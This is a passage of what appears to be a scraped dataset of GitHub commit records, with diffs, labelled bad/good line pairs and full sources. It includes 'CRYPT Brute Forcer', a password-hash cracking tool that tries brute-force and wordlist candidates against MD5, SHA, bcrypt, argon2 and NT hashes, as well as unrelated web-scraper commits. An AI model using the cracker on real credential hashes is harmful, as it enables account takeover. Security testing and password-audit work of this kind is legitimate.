hash_type==\"md5\":\r check=md5(password)\r if check==hash:\r results=f\"Match found:{password}\"\r break\r elif hash_type==\"sha256\":\r check=sha256(password)\r if check==hash:\r results=f\"Match found:{password}\"\r break\r elif hash_type==\"sha512\":\r check=sha512(password)\r if check==hash:\r results=f\"Match found:{password}\"\r break\r bar.update()\r bar.close()\r return results\r \r \r def crackHash_WordList(hash: str, file_path: str | Path):\r results=\"\"\r file_obj=open(file_path, \"r\", encoding=\"UTF-8\")\r bar=tqdm()\r for password in file_obj:\r bar.set_description(f\"Testing{password}\")\r if password==hash:\r print(\"Match found: \", password)\r bar.close()\r break\r bar.update()\r \r return results\r ","sourceWithComments":"# -*- coding: UTF-8 -*-\r\n\"\"\"\r\n    CRYPT Brute Forcer, Password Hash Brute Forcing Tool\r\n    Copyright (C) 2022  N1nj4 R8\r\n\r\n    CRYPT Brute Forcer is free software: you can redistribute it and\/or modify\r\n    it under the terms of the GNU General Public License as published by\r\n    the Free Software Foundation, either version 3 of the License, or\r\n    any later version.\r\n\r\n    CRYPT Brute Forcer is distributed in the hope that it will be useful,\r\n    but WITHOUT ANY WARRANTY; without even the implied warranty of\r\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\r\n    GNU General Public License for more details.\r\n\r\n    You should have received a copy of the GNU General Public License\r\n    along with CRYPT Brute Forcer.  If not, see <https:\/\/www.gnu.org\/licenses\/>.\r\n\"\"\"\r\n\r\n\r\nfrom passlib.context import CryptContext\r\nfrom pathlib import Path\r\nfrom brute import brute\r\nfrom tqdm import tqdm\r\nimport modules.clear as clear\r\nimport time\r\nimport modules.main as main\r\nfrom os import sep\r\nfrom modules.functions import md5, sha256, sha512\r\n\r\n# Colors\r\ngrn = \"\\x1b[0;32m\"  # Green\r\nred = \"\\x1b[0;31m\"  # Red\r\nwte = \"\\x1b[0;37m\"  # White\r\nppl = \"\\x1b[0;35m\"  # Purple (Magenta)\r\nylo = \"\\x1b[0;36m\"  # Yellow\r\nblu = \"\\x1b[0;36m\"  # Blue\r\ncyn = \"\\x1b[0;36m\"  # Cyan\r\ngry = \"\\x1b[0;90m\"  # Grey (Light Black)\r\n\r\n\r\nenc_path = f\".{sep}Results{sep}Encrypted.txt\"\r\ndec_path = f\".{sep}Results{sep}Decrypted.txt\"\r\n\r\n\r\ndef enc_writer(\r\n    txt: str,\r\n    cipher: str,\r\n    method: str | dict[int, str],\r\n    path: str = enc_path,\r\n    cc: bool = False,\r\n    cc_key: int | None = None,\r\n    is_hash: bool = False,\r\n):\r\n    \"\"\"\r\n    Parameters:\r\n    ---\r\n        Required:\r\n        ---\r\n        - txt: The input text.\r\n        - cipher: The cipher name; 'Base64', 'Morse Code', and ... .\r\n        - method: The function that encrypts the text.\r\n        * Example: Base64 --> base64_encrypt(bytes(txt, \"utf-8\"))\r\n\r\n        Optional:\r\n        ---\r\n        - path: The path to write the file.\r\n        - cc: checks if it's Caesar Cipher; Default is False.\r\n        - cc_key: The key used to shift the text.\r\n        - is_hash: True if it's a hash; Default is False.\r\n    \"\"\"\r\n    deco = \"#\" * 50\r\n    times = (\r\n        f\"\\n At {time.localtime().tm_hour}:{time.localtime().tm_min}:{time.localtime().tm_sec}\"\r\n        f\" {time.localtime().tm_mday}\/{time.localtime().tm_mon}\/{time.localtime().tm_year}\"\r\n    )\r\n\r\n    enc_text = f\"{deco}{times}\\n\\n Plain Text: {txt}\\n\\n Encrypted {cipher}: {method}\\n\\n{deco}\\n\"\r\n    if cc:\r\n        enc_text = f\"{deco}{times}\\n\\n Plain Text: {txt}\\n key: {cc_key}\\n\\n Encrypted {cipher}: {method}\\n\\n{deco}\\n\"\r\n    if is_hash:\r\n        enc_text = f\"{deco}{times}\\n\\n Plain Text: {txt}\\n\\n {cipher} Hash: {method}\\n\\n{deco}\\n\"\r\n    path_dir = path.split(sep)\r\n    path_dir = path_dir.pop(-1)\r\n    save_dir = Path(path_dir)\r\n    if not save_dir.exists():\r\n        save_dir.mkdir(parents=True)\r\n    encrypted_file = open(path, \"a+\")\r\n    encrypted_file.write(enc_text)\r\n    encrypted_file.close()\r\n\r\n\r\ndef dec_writer(\r\n    txt: str,\r\n    cipher: str,\r\n    method: str | dict[int, str],\r\n    path: str = dec_path,\r\n    cc: bool = False,\r\n    cc_key: int | None = None,\r\n    is_hash: bool = False,\r\n):\r\n    \"\"\"\r\n    Parameters:\r\n    ---\r\n    - txt: The input text.\r\n    - cipher: The cipher name; 'Base64', 'Caesar Cipher', and ...\r\n    - method: The function that decrypts the text;\r\n    * Example: Base64 -> base64_decrypt(bytes(txt, \"utf-8\"))\r\n\r\n    Optional:\r\n    - path: The path to write the file; If not set, default will be used.\r\n    - cc: checks if it's Caesar Cipher; Default is False.\r\n    - cc_key: The key used to shift the text.\r\n    \"\"\"\r\n    deco = \"#\" * 50\r\n    times = (\r\n        f\"\\n At {time.localtime().tm_hour}:{time.localtime().tm_min}:{time.localtime().tm_sec}\"\r\n        f\" {time.localtime().tm_mday}\/{time.localtime().tm_mon}\/{time.localtime().tm_year}\"\r\n    )\r\n\r\n    dec_text = f\"{deco}{times}\\n\\n Encrypted {cipher}: {txt}\\n\\n Decrypted Text: {method}\\n\\n{deco}\\n\"\r\n    if cc:\r\n        dec_text = f\"{deco}{times}\\n\\n Encrypted {cipher}: {txt}\\n Key: {cc_key}\\n\\n Decrypted Text: {method}\\n\\n{deco}\\n\"\r\n    if is_hash:\r\n        dec_text = f\"{deco}{times}\\n\\n Hash: {txt}\\n\\n {cipher} Decrypted: {method}\\n\\n{deco}\\n\"\r\n    path_dir = path.split(sep)\r\n    path_dir = path_dir.pop(-1)\r\n    save_dir = Path(path_dir)\r\n    if not save_dir.exists():\r\n        save_dir.mkdir(parents=True)\r\n    decrypted_file = open(path, \"a+\")\r\n    decrypted_file.write(dec_text)\r\n    decrypted_file.close()\r\n\r\n\r\ndef crackHash_menu(file_write: bool):\r\n    while True:\r\n        clear.cl_all_v2()\r\n        print(main.menu_crackers())\r\n        cmd_cracker = input(f\"{grn}        CRYPT>{wte} \")\r\n        if cmd_cracker == \"1\":  # Brute Force\r\n            clear.cl_all_v2()\r\n            hash = input(f\"\\n{grn}        [+] Hash:{wte} \")\r\n            length = int(input(f\"\\n{grn}        [+] Max Length:{wte} \"))\r\n            print(\r\n                \"\\nIf 1, ramp up from start_length till length; Otherwise, iterate over current length values.\"\r\n            )\r\n            ramp = bool(int(input(f\"{grn}        [+] Ramp? [1\/0]:{wte} \")))\r\n            start_length = int(input(f\"\\n{grn}        [+] Start length [0<=]:{wte} \"))\r\n            have_letters = bool(\r\n                int(input(f\"\\n{grn}        [+] Include Letters? [1\/0]:{wte} \"))\r\n            )\r\n            have_symbols = bool(\r\n                int(input(f\"\\n{grn}        [+] Include Symbols? [1\/0]:{wte} \"))\r\n            )\r\n            have_numbers = bool(\r\n                int(input(f\"\\n{grn}        [+] Include Numbers? [1\/0]:{wte} \"))\r\n            )\r\n            hash_type = input(\r\n                f\"\\n{grn}        [+] Hash Type [md5\/sha256\/sha512\/auto]:{wte} \"\r\n            ).lower()\r\n            if (\r\n                not hash_type in [\"md5\", \"sha256\", \"sha512\"]\r\n                or not 3 <= len(hash_type) <= 6\r\n            ):\r\n                hash_type = \"auto\"\r\n            results = crackHash_BruteForce(\r\n                hash=hash,\r\n                length=length,\r\n                ramp=ramp,\r\n                start_length=start_length,\r\n                have_letters=have_letters,\r\n                have_symbols=have_symbols,\r\n                have_numbers=have_numbers,\r\n                hash_type=hash_type,\r\n            )\r\n            print(f\"{ylo}\\n\\nResults:\\n{wte}{results}\")\r\n\r\n            if file_write:\r\n                path = f\".{sep}Results{sep}Hash_BF.txt\"\r\n                dec_writer(\r\n                    hash,\r\n                    \"Brute Forced\",\r\n                    results,\r\n                    path,\r\n                    is_hash=True,\r\n                )\r\n            print(f\"{gry}\\n\\n\\t[!] {wte}Press ENTER to continue...\")\r\n            input()\r\n\r\n        elif cmd_cracker == \"2\":  # Wordlist\r\n            clear.cl_all_v2()\r\n            hash = input(f\"\\n{grn}        [+] Hash:{wte} \")\r\n\r\n        elif cmd_cracker.upper() == \"B\":\r\n            break\r\n\r\n\r\ndef crackHash_BruteForce(\r\n    hash: str,\r\n    length: int,\r\n    ramp: bool,\r\n    start_length: int = 1,\r\n    have_letters: bool = True,\r\n    have_symbols: bool = True,\r\n    have_numbers: bool = True,\r\n    hash_type: str = \"auto\",\r\n):\r\n    \"\"\"\r\n    ----\r\n    Parameters\r\n    ----------\r\n    * hash: Hash to crack.\r\n    * length: Length of string to iterate through.\r\n    * ramp: If true, ramp up from start_length till length; Otherwise, iterate over current length values.\r\n    * have_letters: Include uppercase & lowercase letters; default: True.\r\n    * have_symbols: Include symbols; default: True.\r\n    * have_numbers: Include 0-9 digit; default: Trues.\r\n    * start_length: The length of the string to begin ramping through; default: 1.\r\n    * hash_type: Type of hash trying to crack.\r\n    \"\"\"\r\n    bar = tqdm()\r\n    results = \"Match not found\"\r\n    ctx = CryptContext(\r\n        [\r\n            \"md5_crypt\",\r\n            \"ldap_salted_md5\",\r\n            \"sha256_crypt\",\r\n            \"ldap_salted_sha256\",\r\n            \"sha512_crypt\",\r\n            \"ldap_salted_sha512\",\r\n            \"bcrypt\",\r\n            \"argon2\",\r\n            \"nthash\",\r\n            \"pbkdf2_sha256\",\r\n            \"pbkdf2_sha512\",\r\n        ]\r\n    )\r\n    for password in brute(\r\n        start_length=start_length,\r\n        length=length,\r\n        letters=have_letters,\r\n        symbols=have_symbols,\r\n        numbers=have_numbers,\r\n        ramp=ramp,\r\n    ):\r\n        bar.set_description_str(f\"Testing {password}\")\r\n        if hash_type == \"auto\":\r\n            check = ctx.verify(password, hash)\r\n            if check:\r\n                results = f\"Match found: {password}\"\r\n                break\r\n        elif hash_type == \"md5\":\r\n            check = md5(password)\r\n            if check == hash:\r\n                results = f\"Match found: {password}\"\r\n                break\r\n        elif hash_type == \"sha256\":\r\n            check = sha256(password)\r\n            if check == hash:\r\n                results = f\"Match found: {password}\"\r\n                break\r\n        elif hash_type == \"sha512\":\r\n            check = sha512(password)\r\n            if check == hash:\r\n                results = f\"Match found: {password}\"\r\n                break\r\n        bar.update()\r\n    bar.close()\r\n    return results\r\n\r\n\r\ndef crackHash_WordList(hash: str, file_path: str | Path):\r\n    results = \"\"\r\n    file_obj = open(file_path, \"r\", encoding=\"UTF-8\")\r\n    bar = tqdm()\r\n    for password in file_obj:\r\n        bar.set_description(f\"Testing {password}\")\r\n        if password == hash:\r\n            print(\"Match found: \", password)\r\n            bar.close()\r\n            break\r\n        bar.update()\r\n\r\n    return results\r\n"}},"msg":"Merged the 2 file writing functions.\nRemoved dependency on functions.py.\nMade minor changes to Brute-Force function.\nCompleted Wordlist function."}},"https:\/\/github.com\/jaspernicholfabella\/ms_projects":{"706f6c3c4b79b17ea2e08c042edbcc92bdf83e60":{"url":"https:\/\/api.github.com\/repos\/jaspernicholfabella\/ms_projects\/commits\/706f6c3c4b79b17ea2e08c042edbcc92bdf83e60","html_url":"https:\/\/github.com\/jaspernicholfabella\/ms_projects\/commit\/706f6c3c4b79b17ea2e08c042edbcc92bdf83e60","message":"changed brute force","sha":"706f6c3c4b79b17ea2e08c042edbcc92bdf83e60","keyword":"brute force change","diff":"diff --git a\/_finished\/br_ecomsite\/ecomsite.py b\/_finished\/br_ecomsite\/ecomsite.py\nindex fd1ddea..cd136a2 100644\n--- a\/_finished\/br_ecomsite\/ecomsite.py\n+++ b\/_finished\/br_ecomsite\/ecomsite.py\n@@ -58,7 +58,7 @@ def get_raw(self, **kwargs):\n                         )\n                     )\n \n-                    time.sleep(5)\n+                    time.sleep(8)\n                     if not self.is_header_added:\n                         table_header = ZenScraper().get_html_table(driver=driver, just_header=True, id='theTable')\n                         for header in table_header:\ndiff --git a\/_finished\/us_ferc\/xbrl_scraper.py b\/_finished\/us_ferc\/xbrl_scraper.py\nindex 71c1666..41b8126 100644\n--- a\/_finished\/us_ferc\/xbrl_scraper.py\n+++ b\/_finished\/us_ferc\/xbrl_scraper.py\n@@ -69,13 +69,3 @@ def main(argv):\n \n if __name__ == \"__main__\":\n     main(sys.argv)\n-\n-run()\n-\n-if __name__ == \"__main__\":\n-    main(sys.argv)\n-\n-sys.argv)\n-\n-gv)\n-\ndiff --git a\/br_ecomsite\/ecomsite.py b\/br_ecomsite\/ecomsite.py\nindex fd1ddea..cd136a2 100644\n--- a\/br_ecomsite\/ecomsite.py\n+++ b\/br_ecomsite\/ecomsite.py\n@@ -58,7 +58,7 @@ def get_raw(self, **kwargs):\n                         )\n                     )\n \n-                    time.sleep(5)\n+                    time.sleep(8)\n                     if not self.is_header_added:\n                         table_header = ZenScraper().get_html_table(driver=driver, just_header=True, id='theTable')\n                         for header in table_header:\ndiff --git a\/global_applestore\/applestore.py b\/global_applestore\/applestore.py\nindex c790cc6..0da43e5 100644\n--- a\/global_applestore\/applestore.py\n+++ b\/global_applestore\/applestore.py\n@@ -46,10 +46,10 @@ def get_raw(self, **kwargs):\n         \"\"\" Get raw data from source\"\"\"\n         scraper = ZenScraper()\n         scraper.get(self.datapoints['base_url'])\n-        self.get_locale(scraper)\n-        # scraper.get('https:\/\/www.apple.com\/jp\/retail\/shinsaibashi\/')\n-        # individual_store_json = scraper.get_json_from_html_script_tag(id='__NEXT_DATA__')\n-        # print(individual_store_json)\n+        # self.get_locale(scraper)\n+        scraper.get('https:\/\/www.apple.com\/retail\/fifthavenue\/')\n+        individual_store_json = scraper.get_json_from_html_script_tag(id='__NEXT_DATA__')\n+        print(individual_store_json)\n \n         return self.fetch_out\n \n@@ -141,6 +141,8 @@ def scrape_from_local_store(self, local_store, has_state):\n                     local_days['formattedDayDateA11y']\n                 )\n             )\n+            if len(str(formatted_day)) != len(str(datetime.now().day)):\n+                formatted_day = formatted_day[1:]\n \n             cur_day = int(formatted_day)\n             temp_year = datetime.now().year\n@@ -164,10 +166,7 @@ def __remove_unwanted_char(self, str):\n         return clean\n \n \n-\n-\n     def __util_url_from_slug(self, locale, root_path, slug):\n-\n         if locale == 'zh_CN':\n             url = 'https:\/\/www.apple.com.cn\/retail\/' + slug + '\/'\n         else:\n@@ -187,7 +186,6 @@ def normalize(self, raw, **kwargs):\n         return data_frame\n \n     def cleanup(self):\n-\n         for data in set(self.failed_fetch):\n             print(data)\n \ndiff --git a\/us_ferc\/xbrl_scraper.py b\/us_ferc\/xbrl_scraper.py\nindex 71c1666..41b8126 100644\n--- a\/us_ferc\/xbrl_scraper.py\n+++ b\/us_ferc\/xbrl_scraper.py\n@@ -69,13 +69,3 @@ def main(argv):\n \n if __name__ == \"__main__\":\n     main(sys.argv)\n-\n-run()\n-\n-if __name__ == \"__main__\":\n-    main(sys.argv)\n-\n-sys.argv)\n-\n-gv)\n-\ndiff --git a\/utility_scripts\/__pycache__\/zenscraper.cpython-38.pyc b\/utility_scripts\/__pycache__\/zenscraper.cpython-38.pyc\nindex 39ac380..93ad3c1 100644\nBinary files a\/utility_scripts\/__pycache__\/zenscraper.cpython-38.pyc and b\/utility_scripts\/__pycache__\/zenscraper.cpython-38.pyc differ\ndiff --git a\/utility_scripts\/zenscraper.py b\/utility_scripts\/zenscraper.py\nindex b4fb396..3e59c82 100644\n--- a\/utility_scripts\/zenscraper.py\n+++ b\/utility_scripts\/zenscraper.py\n@@ -304,22 +304,12 @@ def add_strings(prefix, improved_json, retry_count, prefix_to_increment='}]'):\n                 prefix += prefix_to_increment\r\n             return None\r\n \r\n-        json_object = add_strings('\"', improved_json, retry_count)\r\n-        if json_object is not None:\r\n-            return json_object\r\n-\r\n-        json_object = add_strings('', improved_json, retry_count)\r\n-        if json_object is not None:\r\n-            return json_object\r\n-\r\n-        json_object = add_strings('\"', improved_json, retry_count, prefix_to_increment=']')\r\n-        if json_object is not None:\r\n-            return json_object\r\n-\r\n-        json_object = add_strings('', improved_json, retry_count, prefix_to_increment=']')\r\n-        if json_object is not None:\r\n-            return json_object\r\n-\r\n+        for prefix_to_increment in ['}]', ']']:\r\n+            for prefix in ['', '\"', '\"}']:\r\n+                json_object = add_strings(prefix, improved_json, retry_count,\r\n+                                          prefix_to_increment=prefix_to_increment)\r\n+                if json_object is not None:\r\n+                    return json_object\r\n         return None\r\n \r\n class ZenElement:\r\n","files":{"\/_finished\/br_ecomsite\/ecomsite.py":{"changes":[{"diff":"\n                         )\n                     )\n \n-                    time.sleep(5)\n+                    time.sleep(8)\n                     if not self.is_header_added:\n                         table_header = ZenScraper().get_html_table(driver=driver, just_header=True, id='theTable')\n                         for header in table_header:","add":1,"remove":1,"filename":"\/_finished\/br_ecomsite\/ecomsite.py","badparts":["                    time.sleep(5)"],"goodparts":["                    time.sleep(8)"]}],"source":"\n\"\"\" Robot creation for BR eCommerce Sites \"\"\" import sys import os import glob import time import random import re from datetime import datetime from pathlib import Path import pandas as pd from selenium.common.exceptions import NoSuchElementException from selenium.webdriver.common.by import By from selenium.webdriver.common.keys import Keys from selenium.webdriver.support.ui import WebDriverWait from selenium.webdriver.support import expected_conditions as EC from dateutil.relativedelta import relativedelta from bs4 import BeautifulSoup from lxml import etree sys.path.append('..\/..\/scripts') from pyersq.web_runner import Runner from pyersq.row import Row from pyersq.selenium_wrapper import SeleniumWrapper as SW import pyersq.utils as squ from ms_projects.utility_scripts.zenscraper import ZenScraper, UtilFunctions class Ecomsite(Runner): \"\"\"Collect data from website\"\"\" def __init__(self, argv): super().__init__(argv, output_prefix='ecomsite', output_subdir=\"raw\", output_type='excel') self.parser=squ.get_parser() self.header=['FetchDate', 'Category', 'Geography'] self.is_header_added=False self.fetch_out=[] self.fetch_date=datetime.now().strftime('%m\/%d\/%Y') def get_raw(self, **kwargs): \"\"\" Get raw data from source\"\"\" input_data=pd.read_csv(os.path.abspath(f'{self.outdir}\/input\/ecomsite_input.csv')) url_dict=input_data.set_index('Links').to_dict()['Geography'] for count,(url, geog) in enumerate(url_dict.items()): try: with SW.get_driver() as driver: SW.get_url(driver, url, sleep_seconds=1) if UtilFunctions().is_partial_run(self.parser): if count > 3: self.fetch_out=UtilFunctions.end_partial_run(self.fetch_out) break WebDriverWait(driver, 60).until( EC.frame_to_be_available_and_switch_to_it( (By.XPATH, \"\/\/iframe[contains(@title, 'Table Master')]\") ) ) time.sleep(5) if not self.is_header_added: table_header=ZenScraper().get_html_table(driver=driver, just_header=True, id='theTable') for header in table_header: self.header.append(header) self.is_header_added=True print('table scraping on url: ', url) table_data=ZenScraper().get_html_table(driver=driver, id='theTable') for data in table_data: self.fetch_out.append([self.fetch_date, self.get_sales_index(url), geog, *data]) except Exception as e: self.fetch_out.append([self.fetch_date, self.get_sales_index(url), geog, *['' for _ in range(5)]]) print(e) return self.fetch_out @staticmethod def get_sales_index(url): if 'de-faturamento' in url: return 'Sales Index' elif 'de-vendas' in url: return 'Orders Index' elif 'de-tiquete' in url: return 'Average Ticket Index' def normalize(self, raw, **kwargs): \"\"\"Save raw data to file\"\"\" data_frame=pd.DataFrame(raw, columns=self.header) data_frame.replace(to_replace=[r\"\\\\t|\\\\n|\\\\r\", \"\\t|\\n|\\r\"], value=[\"\", \"\"], regex=True, inplace=True) return data_frame def main(argv): \"\"\"Main entry\"\"\" web=Ecomsite(argv) web.run() if __name__==\"__main__\": main(sys.argv) ","sourceWithComments":"\"\"\" Robot creation for BR eCommerce Sites  \"\"\"\nimport sys\nimport os\nimport glob\nimport time\nimport random\nimport re\nfrom datetime import datetime\nfrom pathlib import Path\nimport pandas as pd\nfrom selenium.common.exceptions import NoSuchElementException\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.common.keys import Keys\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\nfrom dateutil.relativedelta import relativedelta\nfrom bs4 import BeautifulSoup\nfrom lxml import etree\n\nsys.path.append('..\/..\/scripts')\nfrom pyersq.web_runner import Runner\nfrom pyersq.row import Row\nfrom pyersq.selenium_wrapper import SeleniumWrapper as SW\nimport pyersq.utils as squ\n\nfrom ms_projects.utility_scripts.zenscraper import ZenScraper, UtilFunctions\n\nclass Ecomsite(Runner):\n    \"\"\"Collect data from website\"\"\"\n    def __init__(self, argv):\n        super().__init__(argv, output_prefix='ecomsite', output_subdir=\"raw\", output_type='excel')\n\n        self.parser = squ.get_parser()\n        self.header = ['FetchDate', 'Category', 'Geography']\n        self.is_header_added = False\n        self.fetch_out = []\n        self.fetch_date = datetime.now().strftime('%m\/%d\/%Y')\n\n\n    def get_raw(self, **kwargs):\n        \"\"\" Get raw data from source\"\"\"\n        input_data = pd.read_csv(os.path.abspath(f'{self.outdir}\/input\/ecomsite_input.csv'))\n        url_dict = input_data.set_index('Links').to_dict()['Geography']\n\n        for count, (url, geog) in enumerate(url_dict.items()):\n            try:\n                with SW.get_driver() as driver:\n                    SW.get_url(driver, url, sleep_seconds=1)\n\n                    if UtilFunctions().is_partial_run(self.parser):\n                        if count > 3:\n                            self.fetch_out = UtilFunctions.end_partial_run(self.fetch_out)\n                            break\n\n                    WebDriverWait(driver, 60).until(\n                        EC.frame_to_be_available_and_switch_to_it(\n                            (By.XPATH, \"\/\/iframe[contains(@title, 'Table Master')]\")\n                        )\n                    )\n\n                    time.sleep(5)\n                    if not self.is_header_added:\n                        table_header = ZenScraper().get_html_table(driver=driver, just_header=True, id='theTable')\n                        for header in table_header:\n                            self.header.append(header)\n                        self.is_header_added = True\n\n                    print('table scraping on url: ', url)\n                    table_data = ZenScraper().get_html_table(driver=driver, id='theTable')\n                    for data in table_data:\n                        self.fetch_out.append([self.fetch_date, self.get_sales_index(url), geog, *data])\n\n            except Exception as e: #pylint: disable=broad-except\n                self.fetch_out.append([self.fetch_date, self.get_sales_index(url), geog, *['' for _ in range(5)]])\n                print(e)\n\n        return self.fetch_out\n\n    @staticmethod\n    def get_sales_index(url):\n        if 'de-faturamento' in url:\n            return 'Sales Index'\n        elif 'de-vendas' in url:\n            return 'Orders Index'\n        elif 'de-tiquete' in url:\n            return 'Average Ticket Index'\n\n    def normalize(self, raw, **kwargs):\n        \"\"\"Save raw data to file\"\"\"\n        data_frame = pd.DataFrame(raw, columns=self.header)\n        data_frame.replace(to_replace=[r\"\\\\t|\\\\n|\\\\r\", \"\\t|\\n|\\r\"],\n                   value=[\"\", \"\"], regex=True, inplace=True)\n        return data_frame\n\ndef main(argv):\n    \"\"\"Main entry\"\"\"\n    web = Ecomsite(argv)\n    web.run()\n\nif __name__ == \"__main__\":\n    main(sys.argv)\n"},"\/_finished\/us_ferc\/xbrl_scraper.py":{"changes":[{"diff":"\n \n if __name__ == \"__main__\":\n     main(sys.argv)\n-\n-run()\n-\n-if __name__ == \"__main__\":\n-    main(sys.argv)\n-\n-sys.argv)\n-\n-gv)\n","add":0,"remove":9,"filename":"\/_finished\/us_ferc\/xbrl_scraper.py","badparts":["run()","if __name__ == \"__main__\":","    main(sys.argv)","sys.argv)","gv)"],"goodparts":[]}],"source":"\n\"\"\" Robot creation for XBRL Data Extractor \"\"\" import sys import os import glob import time import random import re from datetime import datetime from pathlib import Path import pandas as pd from selenium.common.exceptions import NoSuchElementException from selenium.webdriver.common.by import By from selenium.webdriver.common.keys import Keys from selenium.webdriver.support.ui import WebDriverWait from selenium.webdriver.support import expected_conditions as EC from dateutil.relativedelta import relativedelta from bs4 import BeautifulSoup from lxml import etree sys.path.append('..\/..\/scripts') from pyersq.web_runner import Runner from pyersq.row import Row from pyersq.selenium_wrapper import SeleniumWrapper as SW import pyersq.utils as squ from ms_projects.utility_scripts.zenscraper import ZenScraper, By, DataObject, UtilFunctions class Xbrl_Scraper(Runner): \"\"\"Collect data from website\"\"\" def __init__(self, argv): super().__init__(argv, output_prefix='xbrl_scraper', output_subdir=\"raw\", output_type='csv') self.datapoints={ \"out\":['FetchDate', 'Filename', 'Period', 'OperatingRevenues', 'OperatingExpenses', 'Depreciation', 'Amortization', 'Grand Total'], } self.parser=squ.get_parser() self.out=Row(self.datapoints['out']) self.fetch_out=[] def get_raw(self, **kwargs): \"\"\" Get raw data from source\"\"\" xbrl_dir=os.path.abspath(f'{self.outdir}\/input\/xbrl') list_of_file=glob.glob(f'{xbrl_dir}\/*xbrl') for file_path in list_of_file: openxbrl=open(file_path, 'r') doc=openxbrl.read() soup=BeautifulSoup(doc, 'lxml') tag_list=soup.find_all() period=self.search_xbrl(tag_list, 'reportperiod') return self.fetch_out def normalize(self, raw, **kwargs): \"\"\"Save raw data to file\"\"\" data_frame=pd.DataFrame(raw, columns=self.out.header()[:-1]) data_frame.replace(to_replace=[r\"\\\\t|\\\\n|\\\\r\", \"\\t|\\n|\\r\"], value=[\"\", \"\"], regex=True, inplace=True) data_frame=data_frame.sort_values(by='Country', key=lambda col: col.str.lower()) return data_frame def main(argv): \"\"\"Main entry\"\"\" web=Xbrl_Scraper(argv) web.run() if __name__==\"__main__\": main(sys.argv) run() if __name__==\"__main__\": main(sys.argv) sys.argv) gv) ","sourceWithComments":"\"\"\" Robot creation for XBRL Data Extractor  \"\"\"\nimport sys\nimport os\nimport glob\nimport time\nimport random\nimport re\nfrom datetime import datetime\nfrom pathlib import Path\nimport pandas as pd\nfrom selenium.common.exceptions import NoSuchElementException\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.common.keys import Keys\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\nfrom dateutil.relativedelta import relativedelta\nfrom bs4 import BeautifulSoup\nfrom lxml import etree\n\nsys.path.append('..\/..\/scripts')\nfrom pyersq.web_runner import Runner\nfrom pyersq.row import Row\nfrom pyersq.selenium_wrapper import SeleniumWrapper as SW\nimport pyersq.utils as squ\n\nfrom ms_projects.utility_scripts.zenscraper import ZenScraper, By, DataObject, UtilFunctions\n\nclass Xbrl_Scraper(Runner):\n    \"\"\"Collect data from website\"\"\"\n    def __init__(self, argv):\n        super().__init__(argv, output_prefix='xbrl_scraper', output_subdir=\"raw\", output_type='csv')\n        self.datapoints = {\n            \"out\": ['FetchDate', 'Filename', 'Period', 'OperatingRevenues', 'OperatingExpenses',\n                    'Depreciation', 'Amortization', 'Grand Total'],\n        }\n\n        self.parser = squ.get_parser()\n        self.out = Row(self.datapoints['out'])\n        self.fetch_out = []\n\n\n    def get_raw(self, **kwargs):\n        \"\"\" Get raw data from source\"\"\"\n        xbrl_dir = os.path.abspath(f'{self.outdir}\/input\/xbrl')\n\n        list_of_file = glob.glob(f'{xbrl_dir}\/*xbrl')\n\n        for file_path in list_of_file:\n            openxbrl = open(file_path, 'r')\n            doc = openxbrl.read()\n            soup = BeautifulSoup(doc, 'lxml')\n            tag_list = soup.find_all()\n            period = self.search_xbrl(tag_list, 'reportperiod')\n            \n        return self.fetch_out\n\n    def normalize(self, raw, **kwargs):\n        \"\"\"Save raw data to file\"\"\"\n        data_frame = pd.DataFrame(raw, columns=self.out.header()[:-1])\n        data_frame.replace(to_replace=[r\"\\\\t|\\\\n|\\\\r\", \"\\t|\\n|\\r\"],\n                   value=[\"\", \"\"], regex=True, inplace=True)\n        data_frame = data_frame.sort_values(by='Country', key=lambda col: col.str.lower())\n        return data_frame\n\ndef main(argv):\n    \"\"\"Main entry\"\"\"\n    web = Xbrl_Scraper(argv)\n    web.run()\n\nif __name__ == \"__main__\":\n    main(sys.argv)\n\nrun()\n\nif __name__ == \"__main__\":\n    main(sys.argv)\n\nsys.argv)\n\ngv)\n\n"},"\/br_ecomsite\/ecomsite.py":{"changes":[{"diff":"\n                         )\n                     )\n \n-                    time.sleep(5)\n+                    time.sleep(8)\n                     if not self.is_header_added:\n                         table_header = ZenScraper().get_html_table(driver=driver, just_header=True, id='theTable')\n                         for header in table_heade","add":1,"remove":1,"filename":"\/br_ecomsite\/ecomsite.py","badparts":["                    time.sleep(5)"],"goodparts":["                    time.sleep(8)"]}],"source":"\n\"\"\" Robot creation for BR eCommerce Sites \"\"\" import sys import os import glob import time import random import re from datetime import datetime from pathlib import Path import pandas as pd from selenium.common.exceptions import NoSuchElementException from selenium.webdriver.common.by import By from selenium.webdriver.common.keys import Keys from selenium.webdriver.support.ui import WebDriverWait from selenium.webdriver.support import expected_conditions as EC from dateutil.relativedelta import relativedelta from bs4 import BeautifulSoup from lxml import etree sys.path.append('..\/..\/scripts') from pyersq.web_runner import Runner from pyersq.row import Row from pyersq.selenium_wrapper import SeleniumWrapper as SW import pyersq.utils as squ from ms_projects.utility_scripts.zenscraper import ZenScraper, UtilFunctions class Ecomsite(Runner): \"\"\"Collect data from website\"\"\" def __init__(self, argv): super().__init__(argv, output_prefix='ecomsite', output_subdir=\"raw\", output_type='excel') self.parser=squ.get_parser() self.header=['FetchDate', 'Category', 'Geography'] self.is_header_added=False self.fetch_out=[] self.fetch_date=datetime.now().strftime('%m\/%d\/%Y') def get_raw(self, **kwargs): \"\"\" Get raw data from source\"\"\" input_data=pd.read_csv(os.path.abspath(f'{self.outdir}\/input\/ecomsite_input.csv')) url_dict=input_data.set_index('Links').to_dict()['Geography'] for count,(url, geog) in enumerate(url_dict.items()): try: with SW.get_driver() as driver: SW.get_url(driver, url, sleep_seconds=1) if UtilFunctions().is_partial_run(self.parser): if count > 3: self.fetch_out=UtilFunctions.end_partial_run(self.fetch_out) break WebDriverWait(driver, 60).until( EC.frame_to_be_available_and_switch_to_it( (By.XPATH, \"\/\/iframe[contains(@title, 'Table Master')]\") ) ) time.sleep(5) if not self.is_header_added: table_header=ZenScraper().get_html_table(driver=driver, just_header=True, id='theTable') for header in table_header: self.header.append(header) self.is_header_added=True print('table scraping on url: ', url) table_data=ZenScraper().get_html_table(driver=driver, id='theTable') for data in table_data: self.fetch_out.append([self.fetch_date, self.get_sales_index(url), geog, *data]) except Exception as e: 